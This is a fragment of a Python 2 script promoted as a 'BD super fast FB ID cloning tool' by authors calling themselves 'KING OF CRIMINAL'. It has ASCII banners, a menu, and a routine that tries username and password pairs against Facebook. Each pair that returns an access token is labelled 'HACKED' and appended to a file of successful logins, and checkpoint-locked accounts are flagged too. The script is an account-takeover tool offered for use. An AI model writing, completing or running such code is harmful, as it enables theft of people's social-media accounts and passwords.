...
print("this tool is free by KING_OF_CRIMINAL")
print
psb('\x1b[1;32mYOU ENTERING BD SUPER FAST FB ID CLONING TOOL PLEASE WAIT......THIS TOOL MAKE BY R1NA.......ANY ONE COPY THIS CODE! CREDIT ME ................KING OF CRIMINAL...............OPENING.............')
for n in range(9999):
...
|_|\_\___|_| \_|\____|  \___/|_|
  ...
  ____ ____  ___ __  __ ___ _   _    _    _
 / ___|  _ \|_ _|  \/  |_ _| \ | |  / \  | |
| |   | |_) || || |\/| || ||  \| | / _ \ | |
| |___|  _ < | || |  | || || |\  |/ ___ \| |___
 \____|_| \_\___|_|  |_|___|_| \_/_/   \_\_____|
 Author: KING OF CRIMINAL 
"""
...
def menu():
    ...
    print 
    print ''
    print'FB OLD ID CLONING [KING OF CRIMINAL]'
    print 50* '-'
    print 'Codder.  : R1NA'
    print 'AUTHOR   : MOHAMMAD SAHEL'
    print 'FACEBOOK : https://www.facebook.com/Sahel.Is.The.Brand0'
    print 'GITHUB   : sorry'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[R1NA-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[KING_OF_CRIMINAL-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[(KING_OF_CRIMINAL)Open After 05 Days]\x1b[0m \n'
